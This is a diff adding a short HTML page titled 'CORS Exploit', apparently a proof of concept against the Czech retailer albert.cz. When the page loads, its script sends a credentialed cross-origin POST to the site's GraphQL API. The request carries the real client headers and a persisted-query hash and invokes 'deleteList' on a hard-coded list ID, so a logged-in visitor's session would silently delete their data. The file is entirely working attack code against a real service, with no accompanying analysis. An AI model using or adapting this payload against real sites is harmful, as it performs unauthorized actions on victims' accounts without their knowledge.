@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Exploit</title>
+</head>
+<body>
+    <h1>Testing CORS Exploit</h1>
+    <script>
+    fetch("https://www.albert.cz/api/v1/", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+            "Content-Type": "application/json",
+            "Apollographql-Client-Name": "cz-alb-web-stores",
+            "Apollographql-Client-Version": "e03a293391be7d2f14f4ad8eef92228191126341",
+            "X-Apollo-Operation-Name": "deleteList",
+            "X-Apollo-Operation-Id": "a9a5bc7d325a0bb2adb6772292bbee5befa21a1b08232b283e2b85f3391df2dd"
+        },
+        body: JSON.stringify({
+            "operationName": "deleteList",
+            "variables": { "listId": "001094717" },
+            "extensions": {
+                "persistedQuery": {
+                    "version": 1,
+                    "sha256Hash": "25e0cadf9796cb2712cd8cfd7631005a6a94ec6e77da433f1ce64d491ee4b6c0"
+                }
+            }
+        })
+    })
+    .then(response => response.text())
+    .then(data => console.log("Response:", data))
+    .catch(err => console.error("Error:", err));
+    </script>
+</body>
+</html>
